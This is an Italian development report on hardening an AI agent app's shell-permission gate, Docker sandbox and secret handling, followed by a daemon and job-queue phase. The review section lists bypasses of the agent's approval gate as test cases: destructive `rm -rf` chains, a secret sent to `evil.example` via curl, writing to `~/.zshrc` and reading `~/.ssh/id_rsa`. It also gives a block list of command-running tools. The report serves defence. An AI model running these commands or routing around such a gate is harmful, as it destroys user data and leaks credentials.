# REPORT — Fase 1: sicurezza e correttezza

**Data:** 2026-10-26 · **Commit:** `fase 1: sicurezza e correttezza` · **Tag:** `fase-1`
**Scope:** correzione delle falle §5.1–5.7 del report di audit (§3.2 = architettura loop/permessi/sandbox cui i fix si applicano).
**Verifica:** `npm test` → **73 test, 8 file, tutti verdi** · `npm run typecheck` pulito · `npm run build` verde.
**Aggiornato dopo review:** commit `fase 1: correzioni review` (tag `fase-1` spostato) — bypass del gate corretti,
114 test verdi; vedi la sezione **«Correzioni review»** in fondo.

---

## 1A — Gate dei permessi shell (§5.1)

**Prima.** `targetKey('run-command')` prendeva la prima parola della riga (`git status; rm -rf /` → chiave `git`) e le standing grant facevano match per prefisso di stringa: una grant su `"rm"` autorizzava `rmdir`, `"git status"` autorizzava `git push`, e una pipeline con un secondo comando non approvato passava se la prima parola era coperta.

**Ora.**
- `src/main/agent/shell-ast.ts`: analisi reale della riga con **web-tree-sitter** + grammatica wasm **tree-sitter-bash** (wasm, non binding nativo: gira in dev, nei test in nodo puro e nell'app impacchettata senza rebuild di Electron).
  - `analyzeCommand(src)` → `{ commands: {name, sub?, argv}[], hasSubstitution, hasRedirectToFile, parseError }`. Estrae **ogni comando semplice** da pipeline, `;`, `&&`, `||`, subshell, `$(…)` e backtick. `sub` = primo argomento non-flag, solo per git/npm/docker/kubectl/brew/pnpm/yarn/cargo/go.
  - **Risoluzione dei .wasm (scelta documentata):** ① env `SANDBOT_WASM_DIR` → ② `<process.resourcesPath>/vendor` nella build impacchettata (electron-builder `extraResources`, riempita da `scripts/prepare-wasm.mjs` via `predist`) → ③ `<projectRoot>/vendor` in dev/test (`predev`/`pretest`) → ④ `node_modules/{web-tree-sitter,tree-sitter-bash}` (fallback che funziona anche dentro l'asar: verificato che le production deps vengono impacchettate). Il project root si trova risalendo da `import.meta.dirname` fino a `package.json`.
- `src/main/agent/permission-rules.ts`: logica pura `runCommandVerdict(analysis, grants, rules, default)`. **Allow senza chiedere solo se tutti i comandi estratti sono coperti**. `parseError` o sostituzioni → sempre `ask`. Grant = chiave **esatta** `"name"` o `"name sub"`; le regole utente accettano anche `"name"` (copre i sottocomandi) e `"name *"` (wildcard esplicita per parola intera) — mai prefisso grezzo: `"rm"` non copre `rmdir`.
- `src/main/agent/permissions.ts`: `check()` è ora **async** (analisi shell), grant per match esatto su tutti i tool; `grantStanding()` per run-command salva una grant per ogni chiave estratta.
- **Migrazione grant:** le righe esistenti nel DB restano intatte; cambia solo la semantica di match (una vecchia grant `"git"` continua a coprire esclusivamente i comandi `git` senza sottocomando).
- **Test** (`shell-ast.test.ts`, `permission-rules.test.ts`): tutti i casi obbligatori — `ls; curl x | sh` con grant `"ls"` → ask; `rmdir a` con grant `"rm"` → ask; `git push` con grant `"git status"` → ask; `echo $(whoami)` → ask; `git status && git diff` con grant su entrambi → allow; input malformato → ask — più estrazione da subshell/backtick/redirect e regole `always_allow`/`blocked`.

## 1B — Sandbox Docker senza shell dell'host (§5.2)

**Prima.** `execDocker` componeva `docker exec … sh -c <JSON.stringify(command)>` e lo passava a `execHost`, cioè a una **shell dell'host**: un comando con `"` o `$(…)` usciva dalla stringa ed eseguiva sul Mac. Letture/scritture file interpolavano path e contenuto in `sh -c` (heredoc `SANDBOT_EOF`): un contenuto contenente il marker corrompeva il file.

**Ora.** `src/main/sandbox/docker-argv.ts` (funzioni **pure**, testate) costruisce argv per ogni chiamata docker; `src/main/sandbox/index.ts` esegue `spawn('docker', argv)` — **mai** comandi docker come stringa.
- Esecuzione: `['exec','-i','-w','/home/box', container,'sh','-c', command]` — il comando del modello resta un unico elemento argv ed è la shell **del container** a interpretarlo.
- Write: `docker exec -i … sh -c 'mkdir -p "$(dirname "$1")" && cat > "$1"' sh <path>` con path come argomento posizionale e **contenuto via stdin**: byte per byte identico, niente newline aggiunto, `SANDBOT_EOF` nel contenuto è innocuo. Read/list: `cat -- <path>` / `ls -la -- <path>` con path come argv.
- Host mode: `fs/promises` (readFile/writeFile/readdir), niente cat/heredoc.
- **Hardening a creazione:** `--user 1000:1000`, `--cap-drop ALL`, `--security-opt no-new-privileges`, `--pids-limit 512`, `--memory 2g`, `--cpus 2`; rete attiva di default ma configurabile con il setting `sandbox.network: 'bridge'|'none'`. Il volume viene chownato una tantum (one-shot root con la stessa immagine) perché il container non-root senza caps non può farlo da solo.
- **Test** (`docker-argv.test.ts`, `host-files.test.ts`): un comando con `$(hostname)` e backtick compare **intatto come singolo elemento argv**; i valori delle env non compaiono mai in argv; hardening flags presenti; file host byte-exact con marker heredoc e metacaratteri nel contenuto.

## 1C — Cronologia del modello (§5.3)

**Prima.** `runTurn` metteva il messaggio corrente **due volte** (una esplicita + una dentro la history), `historyToMessages` tagliava a numero fisso di entry potendo lasciare un `tool` senza la sua chiamata (o viceversa), e le immagini viaggiavano su un messaggio dedicato.

**Ora.** `buildMessages(system, entries, currentImages, opts)` in `src/main/agent/history.ts` (puro, re-esportato da `loop.ts`):
- `[system, ...history]` in ordine cronologico; il messaggio corrente è l'ultimo entry del transcript → compare **una sola volta**; le immagini si attaccano all'**ultimo messaggio utente**.
- Taglio solo a **confine di turno** (suffix conservato parte da un messaggio utente), budget di 40 messaggi.
- Repair delle coppie: `tool-result` orfano → scartato; `tool-call` senza result (interrupt/taglio) → **result sintetico `"interrupted"`**.
- **Test** (`history.test.ts`): ordine, nessun duplicato, immagini sull'ultimo utente, taglio a confine di turno, nessuna coppia orfana, sintetico "interrupted".

## 1D — Tool call parallele (§5.4)

**Prima.** `openAiStream` leggeva solo `c.delta.tool_calls[0]`: una risposta con due tool call nel medesimo chunk ne perdeva una (chiamata mai eseguita → risposta del modello senza result).

**Ora.** Accumulatore puro `mergeToolCallDeltas(acc, deltas)` in `llm.ts`: itera **tutti** i delta del chunk accumulando per `index` (id impostato, nome/argomenti concatenati), ritorna ordinato per indice. **Test** (`llm-toolcalls.test.ts`): due call nello stesso chunk, argomenti frammentati su più chunk, due call frammentate in parallelo, index mancante.

## 1E — Segreti con riferimenti opachi (§5.6)

**Prima.** `read-credential` consegnava il valore **in chiaro al modello** (solo la UI vedeva la versione redatta) e la master key del vault veniva scritta nel Keychain con `security add-generic-password -w <chiave>` — chiave leggibile nell'argv del processo (`ps`).

**Ora.**
- Il tool `read-credential` **non esiste più**. Al suo posto `list-credentials` (solo i nomi, default `always_allow`). Il sistema prompt e la descrizione di `run-command` spiegano il meccanismo.
- Il modello scrive `{{secret:NOME}}` negli argomenti di `run-command`; `src/main/agent/secrets.ts` (puro) risolve i riferimenti **solo al momento dell'esecuzione**: valore iniettato come variabile d'ambiente `SANDBOT_SECRET_NOME` (in host: env dello spawn; in docker: `-e NOME` senza valore, ereditata dall'ambiente del processo docker) e comando riscritto per usare `$SANDBOT_SECRET_NOME`. Nome inesistente → errore con l'elenco dei nomi disponibili, nessuna esecuzione.
- `redactSecrets()` sostituisce il valore con `[redacted:NOME]` in stdout/stderr **prima** che l'output arrivi al modello o al transcript (un'unica versione redatta per entrambi).
- Master key in **electron safeStorage** (setting cifrato con la chiave di sistema). **Migrazione:** se esiste la chiave Keychain legacy viene letta con `find-generic-password` (il valore non passa dall'argv), riportata in safeStorage e **eliminata** dal Keychain.
- **Test** (`secrets.test.ts` + integrazione in `loop.test.ts` con LLM finto, vault e sandbox mockati): il valore non compare mai nei messaggi passati all'LLM né nel contenuto di alcuna entry del transcript; al modello arriva `[redacted:API_KEY]`; la chiamata nel transcript resta opaca (`{{secret:API_KEY}}`).

## 1F — Concorrenza (§5.7)

**Prima.** Ogni `runTurn` sovrascriveva `running.set(agentId, …)`: due turni simultanei sullo stesso agente → il primo perdeva interrupt/approval-resolver, notice e stati sovrapposti.

**Ora.** `loop.ts`: **un turno per agente + una coda per agente**.
- `running.set` avviene solo quando non c'è un run in corso (`running.has` → coda/scarto, check sincrono: nessuna race in JS single-thread).
- Messaggio utente su agente occupato → **accodato** (FIFO, tetto 10 con notice "Coda piena"); **routine** su agente occupato → **scartata con notice** (`routines.ts` passa `source: 'routine'`).
- A fine turno (`finally`) parte il prossimo turno in coda. `running` non viene mai sovrascritta.
- **Test** (`loop.test.ts`, LLM finto con stream "gated"): il secondo messaggio gira **dopo** il primo con ordine cronologico corretto e storia giusta; la routine occupata produce solo la notice; tetto coda rispettato.

---

## File cambiati/aggiunti

| File | Modifica |
|---|---|
| `src/main/agent/shell-ast.ts` | **nuovo** — analisi bash via tree-sitter wasm + risoluzione .wasm |
| `src/main/agent/permission-rules.ts` | chiavi esatte, `runCommandVerdict`, `commandRuleMatches` |
| `src/main/agent/permissions.ts` | `check` async, grant esatte, `grantStanding` multi-chiave |
| `src/main/sandbox/docker-argv.ts` | **nuovo** — argv builder puri + hardening |
| `src/main/sandbox/index.ts` | spawn argv senza shell, file op sicure, env, rete configurabile |
| `src/main/agent/history.ts` | **nuovo** — `buildMessages` puro (taglio a turno, repair coppie) |
| `src/main/agent/llm.ts` | `mergeToolCallDeltas` (tutti i delta, per index) |
| `src/main/agent/secrets.ts` | **nuovo** — `{{secret:NOME}}` → env, redazione |
| `src/main/agent/tools.ts` | `list-credentials`, run-command con risoluzione+redazione |
| `src/main/agent/loop.ts` | buildMessages, check async, coda per agente, running mai sovrascritto |
| `src/main/vault.ts` | safeStorage + migrazione Keychain (argv puliti) |
| `src/main/routines.ts` | `source: 'routine'` |
| `src/main/agent/prompts.ts`, `src/main/store/db.ts`, `src/renderer/.../Settings.tsx`, `README.md` | prompt/regole/UI/docs allineate |
| `scripts/prepare-wasm.mjs`, `package.json` | copia wasm in `vendor/`, script pre*, `extraResources` |
| `src/main/agent/__tests__/`, `src/main/sandbox/__tests__/` | 8 file di test (73 test) |

## Note e limitazioni

- Le grant vecchie nel DB **non** vengono migrate: la semantica esatta le rende semplicemente più strette (una grant `"git"` copre solo `git` senza sottocomando). L'utente può ri-concedere "Always" per le chiavi nuove.
- `sub` è euristico per costruzione ("primo argomento non-flag"): `git -C repo status` produce la chiave `git repo` → chiede approvazione. È il verso sicuro (mai un allow involontario).
- La rete del container resta attiva di default (`bridge`) come richiesto; isolamento totale con setting `sandbox.network: 'none'`.
- Il backend docker richiede Docker in esecuzione; gli argv e le operazioni host sono testati, il percorso container è verificato a livello di costruzione (funzioni pure) senza avviare Docker nei test.

---

# Correzioni review

Un revisore ha verificato la fase 1: il resto è corretto, ma il gate dei permessi
aveva **bypass dimostrati** (con una grant sul nome del comando, `runCommandVerdict`
rispondeva `allow`). Corretti i cinque punti sotto, senza toccare altro. Tutti i
bypass hanno un test che fallisce sul codice del tag `fase-1` originale e passa ora
(verificato eseguendo i nuovi test in un worktree sul tag: 30 fallimenti pre-fix).

## C1 — Comandi che eseguono altri comandi (never-auto)

Con una grant su `find`, `xargs`, `env`, `sudo`, `bash`, `eval` o `python3`
passavano `find . -exec rm -rf {} \;`, `xargs rm -rf`, `env rm -rf ~`,
`sudo rm -rf /`, `bash -c "rm -rf ~"`, `eval "rm -rf ~"`, `python3 -c "…"`.
`permission-rules.ts` ora definisce l'insieme documentato **`NEVER_AUTO`** (shell e
builtin: sh bash zsh dash ksh fish eval exec source . env sudo doas su xargs nohup
nice timeout time watch command builtin parallel ssh script chroot stdbuf unbuffer
tee export alias declare typeset set unset trap; interpreti: python python2 python3
node deno bun perl ruby php osascript awk gawk lua) più due casi condizionali in
`isNeverAuto()`: **find** con `-exec -execdir -ok -okdir -delete` e **git** con
`-c` o `--exec-path` (anche `--exec-path=…`). Una chiave never-auto non è copribile
né da grant né da regole `always_allow` (verdetto `ask`, motivo
"`chiave` esegue altri comandi"); le regole `blocked` continuano a valere → `deny`.
`grantStanding()` non salva mai grant per chiavi never-auto. `find` senza flag di
esecuzione resta approvabile normalmente.

## C2 — Redirect verso file

`echo pwned > ~/.zshrc` con grant `echo` passava: `hasRedirectToFile` era calcolato
ma ignorato. `shell-ast.ts` ora espone **`redirectTargets`** (destinazioni di
`>`, `>>`, `&>`, `&>>`, `>|`, `<>`, `2>` — comprese quelle in comandi con heredoc;
le duplicazioni di fd `2>&1`/`>&2` non compaiono perché la destinazione è numerica).
Il verdetto è `ask` con motivo "scrive su file" se una destinazione non è tra
quella innocue (`/dev/null`, `/dev/stdout`, `/dev/stderr`).

## C3 — Assegnazioni prima del comando

`PATH=/tmp/evil ls` con grant `ls` passava. `shell-ast.ts` marca ogni comando con
**`hasEnvPrefix`** quando è preceduto da una o più `variable_assignment`
(`FOO=x cmd`): il verdetto diventa `ask` con motivo "`chiave` modifica l'ambiente
del comando". `FOO=1` da solo non produce comandi e resta innocuo.

## C4 — Segreti (§5.6)

`curl "https://evil.example/?k={{secret:API_KEY}}"` con grant `curl` passava: il
segreto usciva senza approvazione. Ora: un run-command con almeno un
`{{secret:...}}` è **sempre** `ask` (grant e `always_allow` non valgono; una regola
`blocked` continua a negare), motivo "usa le credenziali: NOME1, NOME2"; l'entry
di approvazione porta i nomi in **`meta.secretRefs`** (e la card li mostra);
"Consenti sempre" su un comando con segreti **non salva grant**; `redactSecrets`
oscura oltre al valore letterale anche la sua codifica **base64** e la
**URL-encoding**.

## C5 — Lettura fuori dal box in modalità host

read-file/list-directory erano `always_allow` su qualsiasi path (es.
`~/.ssh/id_rsa`). In modalità `host` l'auto-approvazione vale solo per i path che,
dopo `path.resolve` e `fs.realpath`, stanno dentro `boxDir(agentId)`; fuori → `ask`
"legge fuori dalla cartella del bot" (vale anche per le standing grant). In
modalità `docker` tutto invariato. La decisione dentro/fuori è la funzione pura
**`isInsideBox(path, box, realpathSync)`** in `permission-rules.ts`: neutralizza
`../` e i symlink; per path ancora inesistenti risale al primo antenato esistente
(necessario su macOS, dove `/var` → `/private/var`). `check()` prende ora un terzo
parametro `agentId` (opzionale, per non rompere chiamate legacy).

---

## REPORT CORREZIONI FASE 1
- File modificati: `src/main/agent/shell-ast.ts` (redirectTargets, hasEnvPrefix, secretRefs nell'analisi), `src/main/agent/permission-rules.ts` (NEVER_AUTO, isNeverAuto, isInsideBox, runCommandVerdict), `src/main/agent/permissions.ts` (check con agentId, gate C5, secretRefs nel Verdict, filtri in grantStanding), `src/main/agent/loop.ts` (passa agentId, meta.secretRefs sull'entry approval), `src/main/agent/secrets.ts` (redazione base64/URL-encoding), `src/renderer/src/components/ApprovalCard.tsx` (riga "Credenziali usate" da meta.secretRefs), test: `permission-rules.test.ts`, `shell-ast.test.ts`, `secrets.test.ts`, `loop.test.ts` aggiornati + nuovo `permissions.test.ts`; `REPORT.md`.
- Decisioni: (1) l'ordine di priorità nel verdetto è parseError → sostituzione → `blocked` (deny, vince su tutto) → segreti (ask) → never-auto/assegnazioni/grant/regole → redirect su file, così una regola `blocked` resta valida anche per i never-auto; (2) una chiave è never-auto se ALMENO un comando con quella chiave lo è (`find . -name x; find . -exec rm {} \;` non concederebbe `find`); (3) il gate C5 in host taglia anche le standing grant, non solo `always_allow`; (4) i due test §5.6 del loop sono stati adattati alla nuova semantica (il comando con segreto ora passa dall'approvazione) e verificano anche il non-salvataggio della grant; (5) `--exec-path=VALORE` è trattato come `--exec-path`; (6) i never-auto salvano comunque le chiavi pulite della stessa riga (es. `ls; bash -c x` concede solo `ls`), coerentemente con la semantica multi-chiave della fase 1.
- Output typecheck/vitest/build: `npm run typecheck` pulito; `npx vitest run` → **114 test, 9 file, tutti verdi** (73 pre-fase + 41 nuovi; i soli 73 originali restano verdi); `npm run build` verde (preload 2.51 kB, renderer 1.178 kB). Verifica pre-fix: i nuovi test eseguiti sul tag `fase-1` (worktree) → 30 fallimenti, tutti i bypass C1–C5 confermati `allow`.
- Non verificato: il percorso Electron impacchettato (dist/dmg) e il backend docker in esecuzione reale (come nella fase 1: argv e logica verificati a livello di funzioni pure); il rendering visivo della ApprovalCard (riga credenziali) non ispezionato a schermo.
- Fuori scope notati: (1) `write-file` in host non ha il gate C5 (è `needs_approval` di default, quindi chiede comunque, ma una regola `always_allow` su write-file varrebbe anche fuori dal box); (2) la redazione dei segreti copre letterale/base64/URL-encoding ma non altre codifiche (hex, ROT13, reversed); (3) `hasEnvPrefix` non copre `export` usato come comando standalone (comunque never-auto via NEVER_AUTO); (4) le grant run-command restano salvate per chiavi con redirect su file o assegnazioni (il gate le chiede comunque ogni volta, ma il DB accumera grant inutilizzate); (5) `command <(cmd)` (process substitution) è già coperto da `hasSubstitution` → ask, ma `|&` (pipe stderr) non ha trattamento dedicato (equivale a una pipe normale).

---

# Fase 2 — Daemon e coda durevole

**Data:** 2026-10-26 · **Commit:** `fase 2: daemon e coda durevole` · **Tag:** `fase-2`
**Scope:** §6.2 (runtime separato dalla UI) + §3bis L1 (agenti sempre accesi); prima del resto i residui fase 1 (commit `fase 2: residui gate`).
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **179 test, 15 file, tutti verdi** (120 pre-fase + 59 nuovi) · `npm run build` verde · chat verificata dal vivo con `npm run dev` (vedi sotto).

## Residui fase 1 (commit separato)

- `isNeverAuto` confronta il **basename** del nome comando: `/usr/bin/env rm -rf ~`, `/bin/bash -c id`, `/usr/bin/find . -exec rm {} \;` ora sono never-auto anche via path assoluto; idem i casi condizionali find/git.
- `FIND_EXEC_FLAGS` include le opzioni che scrivono file: `-fprint -fprint0 -fprintf -fls`.
- Test: verdetto `ask` anche con grant sulla chiave esatta (`/usr/bin/env`, `/bin/bash`, `/usr/bin/find`, `find` per -fprint); `grantStanding` non salva grant per nessuno di questi.

## Architettura

```
┌─ sandbotd (src/daemon/index.ts, Node puro, ELECTRON_RUN_AS_NODE) ─┐
│ store SQLite (db.ts senza electron.app) · coda jobs (lease+retry) │
│ worker (1 job per agente) · scheduler (nextCronRun → job)         │
│ agent loop · sandbox · MCP · HostBridge (notify/safeStorage/screen)│
│ WS 127.0.0.1 porta casuale, token 0600 in data/daemon.json        │
└──────────── RPC JSON {id,method,params} + eventi push ────────────┘
        ↑ Electron main = client sottile (ipc.ts inoltra 1:1)
```

- **Store senza Electron:** `db.ts` prende la directory dati da `setDataDir()` (main app), `--data`/`SANDBOT_DATA_DIR` (daemon) o default `~/.sandbot/data`. L'app continua a usare `userData/data`: stessi dati della fase 1. Le API Electron che il runtime usava passano da **HostBridge**: con la UI aperta diventano RPC (`host.notify`, `host.screen.scaleFactor`, `host.safeStorage.encrypt/decrypt`); senza UI la notifica degrada su `osascript display notification`, il vault resta **bloccato** con errore esplicito al modello (`Vault bloccato: … apri la finestra`), lo scale factor resta 2 (retina, coerente con gli screenshot 2x). Nessuna chiave in chiaro su disco.
- **Coda durevole:** tabella `jobs(id, agent_id, kind, payload_json, run_at, status, lease_until, attempts, last_error, created_at)`. Worker: recovery dei lease scaduti, claim per riga con `UPDATE … WHERE status='queued' AND run_at<=? AND agent_id NOT IN (leased) … RETURNING` (la guardia "agente libero" è anche DENTRO l'UPDATE: due job dello stesso agente tra i candidati non vengono mai presi insieme), lease 2 minuti **rinnovato a ogni passo del loop** (heartbeat sugli eventi, throttle 10s, fallback timer 30s), retry backoff 30s·60s·120s·240s, max 5 tentativi poi `failed`; al riavvio i `leased` scaduti tornano `queued`.
- **Un job attivo per agente:** la coda in memoria di `loop.ts` è sparita; `enqueueUserMessage` mantiene la semantica fase 1 (notice "in coda (posizione N)", tetto 10, "Coda piena"), le routine su agente occupato sono scartate con notice dallo scheduler. `running` in loop.ts resta come rete di sicurezza (turno in eccesso → notice, mai sovrascritto).
- **Scheduler:** niente più node-cron in-process. `src/daemon/cron.ts` (puro, 5 campi + secondi, nomi mesi/giorni, semantica OR dom/dow) calcola il prossimo run; un tick ogni 30s accoda un job `routine-run` quando scade (e all'avvio recupera le routine scadute mentre il daemon era giù, una sola corsa di recupero).
- **Trasporto UI↔daemon:** WebSocket su 127.0.0.1 porta casuale, codec RFC 6455 **scritto in casa** (`src/shared/ws.ts`: frame mascherati client→server, ping/pong, close; handshake `Sec-WebSocket-Accept` con vettore RFC verificato nel test). Token casuale in `data/daemon.json` (permessi **0600**, schema `pid, port, token, startedAt` come `~/.grokbot/local-exec-daemon.json`). Il primo messaggio deve essere `{hello, token}` (confronto timing-safe): token errato → `{hello:false}` + close, nessun metodo eseguito. RPC JSON `{rpc,id,method,params}` → `{rpc,id,ok,result|error}` in entrambe le direzioni; eventi push `{ev: SandbotEvent}` (stessi eventi di fase 1).
- **Avvio:** l'app legge `daemon.json`, verifica pid vivo E (via `ps`) che sia davvero il nostro processo — un pid riusato dal SO dopo il reboot non inganna il riuso — altrimenti spawna `process.execPath` (Electron) con `ELECTRON_RUN_AS_NODE=1` su `out/main/daemon.js --data <dir>`, log in `data/daemon.log`, e aspetta il `daemon.json` fresco (15s). Lock file `daemon.lock` con pid: un secondo daemon sulla stessa directory esce subito. Se l'app muore, il client riconnette (e riavvia il daemon se serve).
- **LaunchAgent:** "Avvia all'accesso" (nuovo tab *generale* delle impostazioni) installa/rimuove `~/Library/LaunchAgents/com.fabio.sandbot.daemon.plist` — `RunAtLoad` + `KeepAlive` (riavvio sui crash), env `ELECTRON_RUN_AS_NODE`/`SANDBOT_DATA_DIR`, XML generato da funzione pura testata (escaping incluso).
- **Main Electron = client sottile:** `ipc.ts` inoltra 1:1 i canali di fase 1 al daemon (preload e renderer **non cambiano**); restano locali `dialog:pick-image`, `notify:test`, `launch-at-login:*`. Gli eventi del daemon vanno alle finestre e aggiornano il tray (che legge lo stesso DB in WAL).

## Verifica manuale (npm run dev e non solo)

1. **Daemon standalone** su dir temporanea: si attiva, scrive `daemon.json` 0600, risponde a `hello`+`ping`+`agents:list`+`permissions:get`; **token errato → `{hello:false}` + chiusura**; un secondo daemon sulla stessa dir esce per il lock; SIGTERM rimuove `daemon.json` e lock.
2. **Chat end-to-end sul DB reale dell'app** (`Application Support/sandbot/data`, agente "Bot", provider Ollama locale): `chat:send` → job queued → worker claim → turno LLM con delta in streaming → risposta **"PONG"** nel transcript → job `done` (attempts 1); eventi `entries/delta/status/agents` ricevuti dal client. Nota: il modello configurato `gemma4:31b-cloud` non esiste più su Ollama; per il test è stato switchato temporaneamente a `glm-5.3-flash:cloud` e **ripristinato**. Nel transcript di sviluppo restano le due voci del test (PONG) e una riga `done` nella tabella jobs.
3. **`npm run dev` con daemon già attivo:** l'app **riusa** il pid esistente (nessun doppio spawn), Electron si collega al WebSocket (verificato con `lsof`), nessun errore nei log; **chiusa l'app il daemon resta vivo** (i bot sopravvivono alla finestra chiusa, obiettivo della fase).
4. **`npm run dev` senza daemon:** l'app spawna `node_modules/electron/dist/…/Electron` in `ELECTRON_RUN_AS_NODE=1` con `out/main/daemon.js --data …`, log scritto in `data/daemon.log`, connessione stabilita, il lock rifiuta un secondo daemon.

## REPORT FASE 2

- **File modificati/creati:**
  - `src/daemon/index.ts` — **nuovo** entrypoint Node puro del daemon (lock, store, ws, worker, scheduler, host bridge, daemon.json).
  - `src/daemon/ws-server.ts` — server WebSocket (127.0.0.1, auth hello+token, broadcast eventi, RPC bidirezionali, keepalive).
  - `src/daemon/rpc.ts` — protocollo puro: envelope RPC/hello/eventi, `isHelloAuthorized` (token timing-safe).
  - `src/shared/ws.ts` — **nuovo** codec WebSocket RFC 6455 puro (frame mascherati/no, ping/pong, acceptKey, tokenEquals).
  - `src/daemon/worker.ts` — worker della coda: recovery, claim, lease con heartbeat sugli eventi, retry/backoff, `drain()` per i test.
  - `src/daemon/scheduler.ts` — tick: routine dovute → job `routine-run` (o notice di scarto se l'agente è occupato), stateless.
  - `src/daemon/cron.ts` — parser + calcolo puro del prossimo run (5 campi + secondi, OR dom/dow, nomi).
  - `src/daemon/enqueue.ts` — policy di accodamento con la semantica fase 1 (notice posizione, tetto 10, "Coda piena").
  - `src/daemon/daemon-files.ts` — lock con pid/liveness e `daemon.json` 0600 (pid, port, token, startedAt).
  - `src/daemon/host-bridge.ts` — bridge notify/safeStorage/scale-factor: RPC alla UI o fallback (osascript / vault bloccato / 2x).
  - `src/daemon/api.ts` — i metodi RPC già esposti da ipc.ts in fase 1, ora lato daemon (+validazione schedule routine).
  - `src/main/store/jobs.ts` — SQL puro della coda (enqueue/claim RETURNING/renew/recover/fail/backoff/cancel) + `JOBS_DDL`.
  - `src/main/store/db.ts` — senza `electron.app`: `setDataDir`/env/arg; tabella `jobs`; `busy_timeout` per due processi sullo stesso DB WAL.
  - `src/main/ws-client.ts` — client WebSocket (upgrade HTTP, frame mascherati, pong).
  - `src/main/daemon-client.ts` — ensureDaemonRunning (pid+ps, spawn `ELECTRON_RUN_AS_NODE`, attesa daemon.json) + client RPC con riconnessione e host handlers.
  - `src/main/launchagent.ts` — plist puro (testato) + install/rimozione LaunchAgent con launchctl.
  - `src/main/ipc.ts` — riscritto client sottile: inoltro 1:1 dei canali, eventi→finestre/tray, host.notify locale, pick-image/notify:test/launch-at-login.
  - `src/main/index.ts` — solo UI: setDataDir, DaemonClient, host handlers (safeStorage, screen), finestra/tray/deep-link; il daemon non muore con l'app.
  - `src/main/agent/loop.ts` — rimossa la coda in memoria (ora è la tabella jobs); `emitLastEntry` esportato; guardia anti-concorrenza invariata.
  - `src/main/vault.ts` — safeStorage iniettabile (`setSafeStorage`), errori espliciti "Vault bloccato" senza mai scrivere chiavi in chiaro.
  - `src/main/computeruse/index.ts` — scale factor da provider (electron.screen nell'app, cache RPC nel daemon, default 2).
  - `src/main/routines.ts` — via node-cron; resta il suggestion engine.
  - `src/main/agent/permission-rules.ts` — residui: basename in `isNeverAuto`, FIND_EXEC_FLAGS di scrittura.
  - `src/shared/types.ts`, `src/preload/index.ts`, `src/renderer/src/components/Settings.tsx` — API + tab *generale* con "Avvia all'accesso".
  - `electron.vite.config.ts`, `package.json` — entry `daemon` nella build main; `asarUnpack` per `out/main/daemon.js`.
  - test nuovi: `jobs.test.ts`, `worker.test.ts`, `cron.test.ts`, `rpc-protocol.test.ts`, `queue.test.ts`, `launchagent.test.ts`; aggiornati `permission-rules.test.ts`, `permissions.test.ts`, `loop.test.ts`.
- **Decisioni prese e perché:** (1) WebSocket scritto in casa invece della dipendenza `ws`: regola "niente dipendenze non richieste" e il canale serve solo a JSON locali su loopback (codec puro ben testato, zero superficie in più); (2) claim con la guardia agente-libero anche DENTRO l'UPDATE — i test hanno dimostrato che calcolare i candidati prima non basta (due job dello stesso agente venivano presi nello stesso batch); (3) parser cron scritto in casa perché node-cron non espone il calcolo del prossimo run (serve per `run_at`); (4) scheduler stateless (un solo timer da 30s che rilegge la tabella routine): CRUD e riavvii non richiedono ricaricamenti e i job pianificati sopravvivono al crash; (5) `daemon.json` include il token (l'originale lo tiene in un file gemello `local-exec-daemon-credential.json`): un solo file 0600 è sufficiente e equivalente; (6) riuso del daemon solo se pid vivo E riga di comando `ps` compatibile (mitiga il pid riusato dal SO dopo un reboot); (7) `agents:delete` cancella anche i job queued/leased dell'agente (nuovo, necessario con la coda durevole); (8) notifica "bot ha risposto": la decisione *se* mostrarla resta dove c'è la finestra (RPC host.notify, suppression se focalizzata, come fase 1), senza UI il daemon notifica via osascript; (9) `heartbeat` del lease cablato sull'emitter del turno: ogni passo del loop emette → rinnova, senza toccare l'interno di runTurn.
- **Deviazioni dal prompt e perché:** (1) `routines:create/update` ora rifiutano schedule non valide (parseCron) invece di accettarle e saltarle silenziosamente allo schedule-time — più onesto verso l'utente, stessa grammatica cron; (2) runTurn chiamato direttamente su agente occupato (invariante violato) scarta con notice invece di accodare: la coda è solo quella durevole, il loop non ha più stato di coda; (3) il plist è installato/rimosso da un'azione esplicita nelle impostazioni come richiesto, ma `launchctl load/unload` non è stato eseguito su questa macchina (vedi "non verificato").
- **Output typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito; vitest `Test Files 15 passed (15)` / `Tests 179 passed (179)`; build `out/main/index.js 18.20 kB` + `out/main/daemon.js 92.66 kB` + preload 2.67 kB + renderer 1.180 kB, `✓ built` per main/preload/renderer.
- **Cosa NON è stato verificato:** (1) il pacchetto `dist`/dmg: il daemon è `asarUnpack`-ato ma le sue dipendenze esterne (openai, web-tree-sitter, SDK MCP) restano nell'asar e un processo `ELECTRON_RUN_AS_NODE` non legge gli asar — in dev tutto funziona, il percorso impacchettato va verificato/aggiustato quando si costruirà il dmg; (2) il toggle "Avvia all'accesso" non è stato attivato davvero (avrebbe registrato un LaunchAgent su questa macchina): solo generazione del plist testata; (3) il rendering visivo della chat/tray non è stato ispezionato a schermo (finestra aperta senza errori, catena renderer→preload→ipc→daemon verificata via RPC/wire); (4) vault bloccato senza UI e scale factor via RPC provati solo per costruzione, non dal vivo; (5) computer use completo non eseguito in questa fase.
- **Problemi fuori scope notati:** (1) `node-cron`/`@types/node-cron` restano in package.json ormai inutilizzati; (2) avvisi rollup `INEFFECTIVE_DYNAMIC_IMPORT` (cosmetici, dovuti ai doppioni statico/dinamico preesistenti); (3) il server ws accetta una sola UI per volta: la seconda connessione calcia la prima (il client dell'app si riconnette da solo, ma due app aperte sulla stessa directory dati si contendono il canale); (4) se il daemon resta vivo con l'app chiusa, le routine continuano a consumare token del provider senza che nessuno guardi — servono le finestre di consegna di §3bis L4 (fase futura); (5) `write-file` in host senza gate C5 e redazioni non letterali (già notati in fase 1, invariati).

---

# Correzioni review fase 2

**Data:** 2026-10-26 · **Commit:** `fase 2: correzioni review` · **Tag:** `fase-2` (spostato con `git tag -f`)
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **198 test, 19 file, tutti verdi** (179 pre-correzioni + 19 nuovi; i 179 originali restano verdi) · `npm run build` verde. Verifica fail-today: sul codice pre-correzioni i 9 test comportamentali nuovi fallivano (3 R1 in `loop.test.ts`, 1 R2 in `queue.test.ts`, 2 R3 in `daemon-files.test.ts`, 3 R4 in `ws-server.test.ts`); `resume.test.ts` e `run-job.test.ts` non giravano per i moduli ancora assenti (`resume.ts`, `run-job.ts`).

